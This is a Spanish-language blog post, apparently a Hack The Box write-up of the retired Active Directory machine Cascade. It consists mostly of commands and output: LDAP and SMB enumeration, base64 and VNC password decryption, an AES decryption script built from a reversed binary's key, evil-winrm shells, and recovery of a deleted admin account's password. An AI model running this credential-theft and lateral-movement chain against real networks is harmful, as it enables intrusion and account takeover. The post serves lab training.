---
layout: post
title:  "Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD
tags: HTB, LDAP, RPCCLIENT, ASREPRoast Attack, Crackmapexec, VNC Encrypt-Decrypt, Shares Groups, Get-ADObject, AD Recycle Bin Group, Powershell, Evil-WinRm, Maquinas Retiradas
---

# Cascade - AD Path ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.182       "
``` 

Procedemos con el siguiente escaneo de Nmap

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-10 18:48:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-10T18:48:54
|_  start_date: 2022-01-10T14:55:16
```
Procedemos a enumerar los servicios tipicos encontrados como `SMB` y vemos que no tenemos recursos compartidos si proporcionar Contraseña
```bash
smbmap -H 10.10.10.182  
[+] IP: 10.10.10.182:445        Name: cascade.local
```
Procedemos a añadir al archivito `nano /etc/hosts` el `Dominio: cascade.local` 

Procedemos a listar con `Crackmapexec` informacion sobre el equipo que nos enfrentamos
```bash
crackmapexec smb 10.10.10.182                          
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)          
```

Procedemos a enumerar el servicio de `Ldap` atraves de uno de los scripts de `nmap`
```bash
nmap -n --script "ldap* and not brute" -oN ldapScan 10.10.10.182
```

Otra forma y la mas habitual es usando `ldapsearch`:
```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' 
```
Como vemos que se nos lista muchisima informacion procedemos a grepear por el `@ Dominio de la Maquina` para enumerar posibles usuarios a nivel del sistema.

```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' | grep "@cascade.local"

userPrincipalName: CascGuest@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
userPrincipalName: util@cascade.local
userPrincipalName: j.wakefield@cascade.local
userPrincipalName: s.hickson@cascade.local
userPrincipalName: j.goodhand@cascade.local
userPrincipalName: a.turnbull@cascade.local
userPrincipalName: e.crowe@cascade.local
userPrincipalName: b.hanson@cascade.local
userPrincipalName: d.burman@cascade.local
userPrincipalName: BackupSvc@cascade.local
userPrincipalName: j.allen@cascade.local
userPrincipalName: i.croft@cascade.local
```

Ahi tenemos unos potenciales usuarios a nivel de sistema para montarnos un diccionario y para intentar hacer un `ASREP-Roasting Attack`

Procedemos a intentar listar un poco de informacion para cada usuario atraves de `ldapsearch` grepeando por el dominio ` -A 20 `

```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' | grep "@cascade.local" -A 20
......
userPrincipalName: "r.thompson"@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132863135972508376
msDS-SupportedEncryptionTypes: 0
"cascadeLegacyPwd:  "   --> Pwd ?¿ Password ?¿ 
......
```

Encontramos fijandonos con nuestro Ojo de Lince una cadena en base64 que podria ser una `Password` para el Usuario `r.thompson` 
```bash
echo "clk0bjVldmE=" | base64 -d                                                                                                 
"rY4n5eva"  --> Password 
```

Procedemos a chequear con crackmapexec la password para el user r.thompson
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva                                                                                 
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

Chequeamos para ver si con `winrm` : 
```bash
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva                                                                         
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

Vemos que el usuario `r.thompson` no pertenece al grupo de `Remote Managment System`
Procedemos a listar Recursos compartidos para el usuario `r.thompson` a nivel de `SMB`

```bash
smbmap -H 10.10.10.182  -u r.thompson  -p rY4n5eva                                                      

[+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

Vemos que tenemos los Permisos de lectura para `Data, NETLOGON, print$, SYSVOL` ... 
Usamos la tool `smbclient` para listar el Recurso en `Data`
```bash
smbclient //10.10.10.182/Data -U 'r.thompson%rY4n5eva'                                                                                                  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 04:27:34 2020
  ..                                  D        0  Mon Jan 27 04:27:34 2020
  Contractors                         D        0  Mon Jan 13 02:45:11 2020
  Finance                             D        0  Mon Jan 13 02:45:06 2020
  IT                                  D        0  Tue Jan 28 19:04:51 2020
  Production                          D        0  Mon Jan 13 02:45:18 2020
  Temps                               D        0  Mon Jan 13 02:45:15 2020
```

Encontramos diferentes Directorios .. asique procedemos a crearnos una montura en un directorio que vamos a crear llamado `mnt` para 
listar toda la informcion o data de manera mas comoda.

Creando la montura con `cifs -t` en el directorio `/mnt/` con `-o` le pasamos el nombre de usuario, la password, el dominio y le decimos con permisos de R y W (lectura y Escritura)  
```bash
mount -t cifs //10.10.10.182/Data /mnt/ -o username=r.thompson,password=rY4n5eva,domain=casscade.local,rw
```

Una vez montada la montura, procedemos a listar todo el contenido con el commando `TREE`:

```bash
tree /mnt                                                                                                                                                    

/mnt
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps
```

Vemos que en el archivo `Meetin_Notes_June_2018_html` encontramos cierta informacion sensible
```bash
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. "Username is TempAdmin (password is the same as the normal admin account password)." </p>
```

Prcedemos a Copiarnos del Recurso Compatido `Data/IT/Temp/s.smith`  el archivo `VNC Install.reg`

```bash
#cp /mnt/IT/Temp/s.smith/VNC\ Install.reg .
#ls                                                                                                                                                                            
'VNC Install.reg'
```

Procedemos a realizar un `cat`
```bash

# cat VNC\ Install.reg                                                                 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
#  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Intentamos decodarla con el comando `xxd -ps -r` pero no nos devuelve nada legible y claro

Buscamos por `VNC Decryp hex password` en Google

Encontramos el siguiente comando para hacerlo

```bash
# echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              1 ⚙
00000000  73 54 33 33 33 76 65 32                        "   |sT333ve2|      "
00000008
```

Procedemos a almacenar las credenciales para el usuario:
`s.smith:sT333ve2`

Chequeamos si este usuario pertenece al `Grupo Remote Managment`

```bash
# crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                              1 ⚙
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

Nos conectamos como el usuario `s.smith` usando `evil-winrm.rb`
```bash
# evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                                1 ⚙

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

Procedemos a enumerar el sistema:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/18/2022   1:00 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
44ee5ac9a106aa0c5aa8488xxxxxxxxxx
```

Procedemos a ver a los grupos que pertenece el usuario `s.smith`
```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment '
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 7:58:05 PM
Password expires             Never
Password changeable          1/28/2020 7:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/28/2020 11:26:39 PM

Logon hours allowed          All

# Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Vemos que pertenecemos al Group `Audit Share` & `IT`

```bash
# smbmap -H 10.10.10.182  -u s.smith -p sT333ve2       
[+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

Procedemos a montarnos una Montura

```bash
# mount -t cifs //10.10.10.182/AUDIT$ /mnt/ -o username=s.smith,password=sT333ve2,domain=casscade.local,rw

```

```bash
# tree /mnt                                                                                                                                                                                                                           1 ⚙
/mnt
├── "CascAudit.exe"
├── CascCrypto.dll
├── DB
│   └── "Audit.db"
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

3 directories, 8 files
                        
```

Procedemos a descargarnos el archiv "Audit.db" para ver si contiene informacion interesante.

```bash
#ls                                                                                                                                                                    
Audit.db  CascAudit.exe  MapAuditDrive.vbs  MapDataDrive.vbs
```

Enumeramos el archivo "Audit.db"
```bash
# file Audit.db                         
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
```

Procedemos a enumerar con SQLite 3.x

```bash
# sqlite3 Audit.db 

SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> 
```

Encontramos una credencial en base64 para el user `ArkSvc`
```bash
# echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64  -d                                                                                                                  

������D�|zC�;
```
Vemos que se nos devuelve `Data-No-Legible` por lo que podemos pensar que la contraseña esta cifrada de alguna forma.

Vemos que teniamos un archivo `.exe` en los recursos compartidos que podemos intentar a leer el codigo del binario de windows
```bash
# ls                                                                                              
Audit.db  "CascAudit.exe"
```

Procedemos a pasarnos el Archivo CascAudit.exe a una maquina Windows con el Sofware `DotUltimate` para analizar el codigo

Conseguimos ver que se esta untilizando un Cifrado CBC y encontramos una `Key`

Encontramos un Script para Desencryptar la password encontrada

```bash
# cat Decode_Pass.py                                                                                     130 ⨯ 1 ⚙
import pyaes
from base64 import b64decode
# Variables
key = b"c4scadek3y654321" # Encontramos esta KEY mirando el Codigo del CascAudit.exe desde Windows con DotUltimate 
iv = b"1tdyjCbY1Ix49842"

# CBC Operation
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)

# Desencriptado con la password que encontramos en Audit.db
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

Procedemos a usar el script en python una vez seteamos el valor de `key` y `La Password encontrada en Decrypted`

```bash
# python3 Decode_Pass.py                                                                                                 1 ⚙

w3lc0meFr31nd
```

Ya tendriamos la contraseña del usuario `ArkSvc`, procedemos a validarla con `Crackmapexec`

```bash
# crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                           1 ⚙
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
                                                                                                                                                                      # crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                         1 ⚙
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

Procedemos a intentar conectarnos como el usuario `ArkSvc` con `evil-winrm.rb`

```bash
# evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                         1 ⚙

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 
```

Enumeramos los privilegios para el usuario

```bash
*Evil-WinRM* PS C:\Users\arksvc> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Enumeramos los Grupos a los que pertenece el usuario `ArkSvc`

```bash
*Evil-WinRM* PS C:\Users> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
Users comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 4:18:20 PM
Password expires             Never
Password changeable          1/9/2020 4:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 9:05:40 PM

Logon hours allowed          All

Local Group Memberships      "*AD Recycle Bin"       "*IT"
                             "*Remote Management Use"
Global Group memberships     "*Domain Users"
The command completed successfully.
```

Vemos que pertenecemos al Grupo `AD Recycle Bin`

```bash

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=cascade,DC=local
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681

Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

Procedemos a buscar por el Name `Temp Admin` que como nos decian habia tenido temporamente una password = a la del Administrador

Procedemos a intentar listar todo el Contenido anterior y sus Propiedades con el siguiente Comando en PowerShell

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
"cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz"
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Procedemos a decodear la password

```bash
$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d 

"baCT3r1aN00dles"
```

Probamos con Crackmapexec a hacer validar para que usuario perneceria esta password
```bash
# crackmapexec smb 10.10.10.182 -u users -p baCT3r1aN00dles                                                                             
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles "(Pwn3d!)"
```

Procedemos a conectarnos con Evil WinRM y sacar la Flag de Root.txt
```bash
# evil-winrm.rb -i 10.10.10.182 -u administrator -p baCT3r1aN00dles                                                 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/25/2022   8:53 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
XXXXXXXXXXb5ab6469c8baea4d5xxxxx
```

Maquina Cascade - AD Path - Rooteada =) Seguimos H4ck









